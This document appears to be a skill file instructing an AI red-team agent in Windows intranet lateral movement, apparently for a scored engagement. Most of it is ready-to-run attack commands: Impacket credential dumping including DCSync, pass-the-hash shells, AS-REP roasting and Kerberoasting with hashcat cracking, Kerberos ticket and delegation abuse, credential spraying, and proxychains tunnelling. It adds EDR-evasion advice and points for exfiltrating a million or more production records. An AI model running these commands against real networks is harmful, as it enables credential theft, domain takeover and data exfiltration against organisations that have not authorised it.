---
name: lateral-movement
description: "Intranet lateral movement & privilege escalation: Impacket toolkit (PtH/PsExec/WMI/DCOM/Kerberos/secretsdump) + enum4linux/smbclient enumeration"
whenToUse: "Upon establishing an initial foothold in an internal network, leveraging compromised credentials or hashes to pivot to additional hosts, enumerate domain environments, dump credentials, and map paths to domain controllers"
role: internal
enabled: true
---

# Intranet Lateral Movement & Privilege Escalation (Impacket Suite)

Once initial host execution and internal network reachability are established, **pivoting across servers** (`server-host`) and **compromising domain controllers / central management systems** (`central-system`)
represent the primary objectives of the intranet phase. The local system is equipped with **61 `impacket-*` utilities**, serving as the core engine for this phase.

## Local Toolkit

| Tool | Path | Purpose |
| --- | --- | --- |
| Impacket Suite | `/usr/bin/impacket-*` (61 commands) | Protocol-level lateral movement, credential dumping, Kerberos attacks |
| enum4linux | `/usr/bin/enum4linux` | SMB and domain information enumeration (users, shares, policies) |
| smbclient | `/usr/bin/smbclient` | SMB share browsing, file upload/download |
| nbtscan | `/usr/bin/nbtscan` | NetBIOS name and workgroup scanning |
| proxychains4 | `/usr/bin/proxychains4` | Route CLI tools through established SOCKS tunnels (**use `-f` temporary config only**) |

## 0. Initial Situational Awareness

```bash
# 1) Review current inventory (credentials / hashes / domain records)
#    redteam_credential_list / redteam_access_list / redteam_asset_query

# 2) Enumerate domain structure (once valid domain credentials exist)
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # Null session enumeration of users/shares/policies

# 3) File shares and permissions
smbclient -L //<target> -N                                  # Anonymous/null session share listing
smbclient //<target>/<share> -U <user>%<pass>                # Browse accessible shares
impacket-smbclient <domain>/<user>:<pass>@<target>           # Interactive shell (cd/ls/get/put)
```

**Network mapping should still leverage gogo/fscan** (skills `gogo-intranet` / `fscan-intranet`); this skill guides pivoting after target nodes are identified.

## 1. Credential Dumping (Top Priority After Host Compromise)

```bash
# 1) Remote dump of SAM/LSA/SECRETS (requires administrative credentials)
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # Pass-the-Hash dump

# 2) Local offline SAM dump
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync (requires Domain Admin or replication privileges) — dumps all domain hashes
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) Extract plaintext / Kerberos tickets: pair with on-host tools (e.g. mimikatz) or lsassy
#    Cracked offline via credential-attack, or reused directly via Pass-the-Hash
```

**Ledger Registration**: Extracted `NTLM` hashes must be recorded immediately via `redteam_credential_add` (`source=credential-dumping`;
plaintext passwords into `secret_value`, hashes into `note` or `secret_value` with type noted), with raw dumps archived under `runs/`.

## 2. Pass-the-Hash (PtH: Lateral Movement Without Plaintext)

```bash
# Command Execution
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # Interactive SYSTEM shell (high noise)
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # Semi-interactive shell (low noise, recommended)
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # Single task execution (stealthiest)
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # Execution via service manipulation

# File System Operations
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# Database Interaction
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec drops temporary service binaries onto disk and is frequently intercepted by EDR solutions**; prioritize `wmiexec` and `atexec`.

## 3. Active Directory & Kerberos Attacks

```bash
# 1) Username enumeration + AS-REP Roasting (no password required; targets pre-auth disabled accounts)
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # Offline cracking

# 2) Kerberoasting (targets SPN service accounts to extract TGS tickets)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) Ticket Granting Ticket (TGT) requests and pass-the-ticket
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # Request TGT -> .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # Execute lateral movement via Kerberos ticket

# 4) Unconstrained / Constrained Delegation Attacks
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 4. Credential Reuse (Prioritize over Active Exploits)

Whenever any valid account credential or hash is obtained, **test horizontal reuse first**:
1. Spray identical credentials against sibling hosts (`wmiexec` loops) across SMB, WinRM, RDP, SSH, MSSQL, and MySQL.
2. Local Administrator Password Reuse (workstations deployed from identical system templates often share local admin passwords) — **the most effective lateral technique in enterprise environments**.
3. Domain Accounts -> test against enterprise shares, internal ticketing/wiki systems, and management portals.
4. Pass-the-Hash -> script PtH across reachable host lists in `runs/hosts.txt`.

## 5. Tunnel Routing Integration

```bash
# Prepend all commands with proxychains4 pointing to an isolated config file
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# Note: proxychains proxies TCP streams only; UDP Kerberos traffic or reverse callbacks require chisel/frp port forwarding
```

## 6. Operational Discipline & Guardrails

1. **Focus on Critical Objectives**: The intranet objective is **central infrastructure** (Domain Controllers, jump boxes, virtualization clusters, database nodes, code repos, backup systems) — not compromising every endpoint indiscriminately.
2. **Noise Control**: Avoid indiscriminate service installations (`psexec`) and noisy memory scraping (`secretsdump`) against sensitive domain nodes; prefer `wmiexec` with measured execution pacing.
3. **Avoid Self-Inflicted Lockouts**: Domain account lockout policies trigger quickly on consecutive bad passwords; reuse known good credentials and adhere to the rate limits in `credential-attack`.
4. **Zero Destructive Actions**: Do not stop core services, alter system-wide security policies, or purge event logs unless explicitly instructed and authorized.
5. **Asset Tracking**: Register every newly reached host via `redteam_asset_add` (`tags: ["internal"]`), log successful sessions via `redteam_access_add`, and record extracted credentials via `redteam_credential_add`.

## 7. Output & Ledger Registration (Mandatory)

1. **Score Claims for Lateral Pivots**: `redteam_score_hit` (`server-host`), with `evidence` formatted as:
   "source_host -> target_host:port | credentials_used | output_summary" (e.g. `10.0.0.5 -> 10.0.0.9:445 | PtH local admin hash | whoami=nt authority\system`).
2. **Central Infrastructure Scoring**: Compromising Domain Controllers, jump boxes, CI/CD platforms, or database clusters -> `central-system`.
   Exfiltrating large-scale production records -> `bigdata-system` (**requires actual count >= 1,000,000 records**).
3. **Credential Ingestion**: `redteam_credential_add`, identifying `source` (`credential-dumping` / `kerberoasting` / `asrep-roasting` / `credential-reuse` / `offline-crack`),
   recording raw command in `tool`, plaintext password in `secret_value`, and dump path in `secret_ref`.
4. **Access Session Ingestion**: `redteam_access_add` (`method=smb` / `wmi` / `pth` / `kerberos` / `ssh` / `rdp`).
5. Record key events in `redteam_chain_add`: `stage_code=internal` or `target`, recording raw command line text (including flags like `-hashes`, `-k -no-pass`) in `tool` and execution summary in `result`.
6. **Knowledge Base Feedback**: Archive reusable custom exploit scripts via `redteam_poc_add` (specifying `category`, `engagement`, `asset_target`, and sanitized `verified_note`).
